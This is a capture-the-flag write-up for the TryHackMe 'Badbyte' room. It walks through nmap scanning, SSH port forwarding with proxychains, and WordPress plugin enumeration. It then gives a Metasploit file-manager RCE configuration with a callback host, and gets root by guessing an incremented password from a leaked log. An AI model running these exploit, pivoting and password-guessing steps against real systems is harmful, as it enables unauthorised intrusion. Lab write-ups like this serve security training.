---
description: SSH Portforwarding
---

# 22 - Badbyte

Room Link --> [https://tryhackme.com/room/badbyte](https://tryhackme.com/room/badbyte)

### Enumeration

#### nmap

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -sV 10.10.143.30 -T4 -Pn -n -p- -vv --min-rate 10000

# outputs
PORT      STATE    SERVICE REASON      VERSION
22/tcp    filtered ssh     no-response
30024/tcp open     ftp     syn-ack     vsftpd 3.0.3
Service Info: OS: Unix
```
{% endcode %}

To complete this task:

1. Setup Dynamic Port Forwarding using SSH.\
   HINT:`-i id_rsa -D 1337`
2. Set up proxychains for the Dynamic Port Forwarding. Ensure you have commented out `socks4 127.0.0.1 9050` in your proxychains configuration and add `socks5 127.0.0.1 1337` to the end of configuration file (`/etc/proxychains.conf`).

<figure><img src=".gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

#### Setup SSH Dynamic Portforward

`ssh -D 1337 -i id_rsa errorcauser@10.10.143.30 -fN` .

<figure><img src=".gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

#### Enumerate internal ports using proxychains

`proxychains4 nmap -sT 127.0.0.1` .

<figure><img src=".gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

Some ports are open on the remote machine ie \[80, 22, 3306].

#### Setup SSH Local Portforwarding to the remote port 80

`ssh -L 8000:127.0.0.1:80 -i id_rsa errorcauser@10.10.143.30 -fN` .

We can navigate to `127.0.0.1:8000` in webbrowser to access the page alternatively.

<figure><img src=".gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

### Web Exploitation

`proxychains4 nmap -sT 127.0.0.1 -p80 -A -T4`\`

<figure><img src=".gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

To access the web server, we configure foxy proxy on firefox.

<figure><img src=".gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>

Then we navigate to: `127.0.0.1:80` .

<figure><img src=".gitbook/assets/image (183).png" alt=""><figcaption></figcaption></figure>

#### Enumerate vulnerable plugins

enumerating wordpress plugins with nmap.

`nmap 127.0.0.1 -p8000 --script http-wordpress-enum --script-args type="plugins",search-limit=1500 -vv` .

<figure><img src=".gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>

Google "**duplicator 1.3.26 exploit**" and found the "CVE-2020-11738"  dir traversal vulnerability.

Google "**wp-file-manager 6.0 exploit**" and found the "CVE-2020-25213" RCE vulnerability.

### Initial Access

Using metasploit :), you can use any Github POC out there too :)

{% code overflow="wrap" lineNumbers="true" %}
```bash
use exploit/multi/http/wp_file_manager_rce
set RHOSTS 127.0.0.1
set RPORT 8000
set LHOST 10.18.88.214
run

# and got  meterpreter session.
```
{% endcode %}

<figure><img src=".gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

### Priv Esc

IN the home dir, there is a ".vininfo" file, cat the file and it mentions "/var/log/bash.log"

then i view the details of the file and found the user old password `G00dP@$sw0rd2020` .

We have to guess the new password and login via ssh, so i tried `G00dP@$sw0rd2021` and it worked.

<figure><img src=".gitbook/assets/image (187).png" alt=""><figcaption></figcaption></figure>

And am in :)

I checked `sudo -l` and we can run all cmds, so `sudo su` and we are root.

Done.

